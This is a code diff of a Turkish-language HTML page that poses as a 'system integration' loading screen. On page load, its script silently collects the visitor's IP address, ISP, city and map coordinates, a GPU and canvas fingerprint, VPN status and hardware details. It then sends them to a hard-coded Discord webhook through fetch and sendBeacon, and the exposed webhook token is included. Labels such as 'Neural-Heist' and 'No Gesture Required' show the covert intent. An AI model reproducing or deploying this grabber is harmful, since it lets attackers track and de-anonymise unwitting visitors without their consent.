@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Yapılandırması</title>
+    <title>Sistem Entegrasyonu</title>
     <style>
         body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
         .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 25px; height: 25px; animation: s 1s linear infinite; }
@@ -14,82 +15,84 @@
     <div class="l"></div>
 
     <script>
-        const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function deepHeist() {
-            let info = { gpu: "X", ven: "X", ip: "X", iss: "X", loc: "X", vpn: "✅ Temiz", sys: "X" };
+        async function totalExpose() {
+            let d = { gpu: "X", ven: "X", ip: "X", iss: "X", vpn: "✅ Temiz", sys: "X", hash: "X" };
 
-            // 1. GPU VENDOR BYPASS: HASSASİYET ANALİZİ (Mathematical Fingerprinting)
+            // 1. GPU MASKESİNİ KIRMA (Canvas Fingerprinting)
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                 
-                let rawVen = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
-                let rawRen = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                // Maskelenmiş veri
+                let rnt = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                let vnd = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
 
-                // Eğer WebKit/Generic maskesi varsa, matematiksel imza analizi yap
-                if (rawVen.includes("WebKit") || rawVen.includes("Apple")) {
-                    const shaderPrecision = gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT).precision;
-                    const maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
-                    // Apple GPU'lar genellikle belirli bir hassasiyet ve texture size kombinasyonu verir
-                    info.ven = `🍎 Apple Silicon (Tahminlenen)`;
-                    info.gpu = `Apple GPU (Shader Precision: ${shaderPrecision}, MaxTexture: ${maxTextureSize})`;
-                } else {
-                    info.ven = rawVen;
-                    info.gpu = rawRen;
-                }
-            } catch(e) { info.ven = "Donanım Korumalı"; }
+                // Donanım İmzası (Checksum) - Maske olsa bile bu değer GPU'ya özeldir
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Hacker-Mode-On", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("Hacker-Mode-On", 4, 17);
+                d.hash = canvas.toDataURL().slice(-50, -10); // GPU'nun işleme imzası
 
-            // 2. AGRESİF VPN TESPİTİ (Zaman Kayması & ISP Derin Sorgu)
+                d.ven = vnd.includes("WebKit") ? `🍎 Apple / WebKit (Maskeli)` : vnd;
+                d.gpu = rnt.includes("WebKit") ? `Hardware Hash: ${d.hash}` : rnt;
+            } catch(e) {}
+
+            // 2. AGRESİF VPN & ISS ANALİZİ (Zaman Kayması Analizi)
             try {
-                const start = performance.now();
                 const res = await fetch('https://ipapi.co/json/');
-                const latency = performance.now() - start;
                 const j = await res.json();
                 
-                const systemTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const ipTz = j.timezone;
+                const sysTime = new Date();
+                const sysTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 
-                info.ip = j.ip;
-                info.iss = `${j.org} (AS${j.asn})`;
-                info.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${info.iss}\`\n🗺️ [Harita](https://www.google.com/maps?q=$${j.latitude},${j.longitude})`;
-
-                // VPN TESPİT MOTORU
+                d.ip = j.ip;
+                d.iss = `${j.org} (AS${j.asn})`;
+                
+                // VPN TESPİT ALGORİTMASI
                 let vpnDetected = false;
                 if (j.proxy || j.hosting) vpnDetected = true;
-                if (systemTz !== ipTz) vpnDetected = true; // Zaman Dilimi Çakışması
-                if (latency > 500 && j.country_code !== "TR") vpnDetected = true; // Yüksek Gecikme Analizi
+                if (j.timezone !== sysTz) vpnDetected = true; // Kesin Kanıt: Zaman Dilimi Uyuşmazlığı
 
-                info.vpn = vpnDetected ? `⚠️ **VPN/PROXY ALGILANDI**\n(Sistem: ${systemTz} | IP: ${ipTz})` : "✅ Temiz";
-            } catch(e) { info.vpn = "⚠️ Analiz Engellendi (VPN Aktif)"; }
+                d.vpn = vpnDetected ? `⚠️ **VPN/PROXY ALGILANDI**\n(IP Saati: ${j.timezone} | Cihaz Saati: ${sysTz})` : "✅ Temiz";
+                
+                d.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${d.iss}\`\n🗺️ [Harita](http://googleusercontent.com/maps.google.com/4{j.latitude},${j.longitude})`;
+            } catch(e) { d.vpn = "⚠️ Analiz Engellendi (Kritik VPN)"; }
 
-            // 3. SİSTEM VE DONANIM (OS, EKRAN, DİL)
-            info.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Core\n💾 **RAM:** ${navigator.deviceMemory || 'X'} GB\n📐 **Ekran:** ${screen.width}x${screen.height}\n🌍 **Dil:** ${navigator.language}`;
+            // 3. SİSTEM DETAYLARI
+            d.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Core\n💾 **RAM:** ${navigator.deviceMemory || 'X'} GB\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n🌍 **Dil:** ${navigator.language}`;
 
             // 4. KUSURSUZ GÖNDERİM
             const payload = {
                 embeds: [{
-                    title: "💀 KUSURSUZ ADLİ ANALİZ: NEURAL-HEIST",
+                    title: "💀 ADLİ ANALİZ: TRUE-ID V20",
                     color: 15158332,
                     fields: [
-                        { name: "🛡️ GÜVENLİK ANALİZİ", value: info.vpn, inline: false },
-                        { name: "📡 AĞ VE ISS KATMANI", value: `${info.loc}\n**IP:** \`${info.ip}\``, inline: false },
-                        { name: "🛠️ DONANIM (BYPASS)", value: `**Vendor:** \`${info.ven}\`\n**Renderer:** \`${info.gpu}\``, inline: false },
-                        { name: "⚙️ SİSTEM DETAYLARI", value: info.sys, inline: false }
+                        { name: "🛡️ GÜVENLİK DURUMU", value: d.vpn, inline: false },
+                        { name: "📡 AĞ VE ISS KATMANI", value: `${d.loc}\n**IP:** \`${d.ip}\``, inline: false },
+                        { name: "🛠️ DONANIM İMZASI (GPU BYPASS)", value: `**Vendor:** \`${d.ven}\`\n**Renderer:** \`${d.gpu}\``, inline: false },
+                        { name: "⚙️ SİSTEM DETAYLARI", value: d.sys, inline: false }
                     ],
-                    footer: { text: "Protocol: Neural-Heist | No Gesture Required" },
+                    footer: { text: "Protocol: True-ID | Deep Extraction" },
                     timestamp: new Date()
                 }]
             };
 
             const blob = JSON.stringify(payload);
-            fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
-            navigator.sendBeacon(hook, blob);
+            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
+            navigator.sendBeacon(u, blob);
         }
 
-        window.onload = () => { setTimeout(deepHeist, 400); };
+        window.onload = () => { setTimeout(totalExpose, 500); };
     </script>
 </body>
 </html>
-
